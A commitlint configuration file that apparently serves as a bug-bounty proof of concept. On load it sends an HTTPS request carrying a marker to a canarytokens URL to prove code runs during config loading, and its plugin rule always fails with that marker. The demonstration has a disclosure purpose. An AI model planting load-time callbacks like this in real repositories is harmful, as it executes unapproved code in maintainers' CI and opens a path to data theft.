const https = require('https');

const uniqueMarker = 'CR_H1_SAFE_COMMITLINT_CONFIG_PR39';

// Safe canary: single GET to prove code execution during config load
try {
  https.get(`https://canarytokens.thinkst.com/articles/commitlint-pr39-load/${uniqueMarker}`, () => {});
} catch (e) { /* ignore */ }

module.exports = {
  extends: [],
  rules: {
    'header-max-length': [2, 'always', 72],
    'type-empty': [2, 'never'],
  },
  plugins: [{
    rules: {
      'controlled-boundary': (parsed) => {
        return [false, uniqueMarker];
      }
    }
  }]
};
